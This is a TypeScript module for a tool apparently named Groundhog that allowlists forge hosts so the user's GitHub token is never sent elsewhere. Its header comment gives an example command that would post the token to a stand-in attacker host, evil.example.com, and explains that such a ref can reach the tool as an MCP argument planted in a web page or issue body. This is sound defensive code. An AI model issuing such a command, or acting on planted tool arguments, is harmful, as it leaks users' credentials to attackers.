/**
 * Which hosts Groundhog is willing to talk to.
 *
 * A repo ref carries its own hostname, and requests to it carry your GitHub
 * token. Left unchecked, `groundhog sync evil.example.com/a/b` posts that token
 * straight to an attacker — and the ref can arrive as an MCP tool argument,
 * which may originate in a web page, an issue body, or anything else the caller
 * happened to be reading.
 *
 * So the destination is allowlisted, not merely sanitized. GitHub Enterprise
 * users add their own host explicitly.
 */

export const DEFAULT_ALLOWED_HOSTS = ["github.com"] as const;

export const ALLOWED_HOSTS_ENV = "GROUNDHOG_ALLOWED_HOSTS";

export function allowedHosts(env: NodeJS.ProcessEnv = process.env): string[] {
  const extra = (env[ALLOWED_HOSTS_ENV] ?? "")
    .split(",")
    .map((h) => h.trim().toLowerCase())
    .filter(Boolean);
  return [...DEFAULT_ALLOWED_HOSTS, ...extra];
}

export function isHostAllowed(host: string, env: NodeJS.ProcessEnv = process.env): boolean {
  return allowedHosts(env).includes(host.trim().toLowerCase());
}

/** Throws before any credential can leave the machine. */
export function assertHostAllowed(host: string, env: NodeJS.ProcessEnv = process.env): void {
  if (isHostAllowed(host, env)) return;
  throw new Error(
    `Refusing to contact "${host}": it is not an allowed forge host, and requests carry your ` +
      `GitHub token.\nIf this is your GitHub Enterprise server, allow it explicitly:\n` +
      `  ${ALLOWED_HOSTS_ENV}=${host}`,
  );
}
